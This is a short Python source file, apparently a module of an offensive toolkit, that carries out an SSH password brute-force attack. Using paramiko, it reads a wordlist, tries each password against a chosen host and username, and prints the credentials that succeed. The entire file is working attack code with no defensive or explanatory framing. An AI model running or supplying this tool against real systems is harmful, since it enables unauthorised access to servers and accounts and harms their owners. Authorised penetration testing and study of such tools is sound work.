# modules/brute_forcer.py
import paramiko

def ssh_brute(host, port, username, wordlist_path):
    print(f"[+] Starting SSH brute-force on {host}:{port} with username '{username}'")
    try:
        with open(wordlist_path, 'r') as f:
            for password in f:
                password = password.strip()
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=port, username=username, password=password, timeout=3)
                    print(f"[!] Success: {username}@{host} with password: {password}")
                    ssh.close()
                    return
                except:
                    print(f"[-] Failed password: {password}")
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
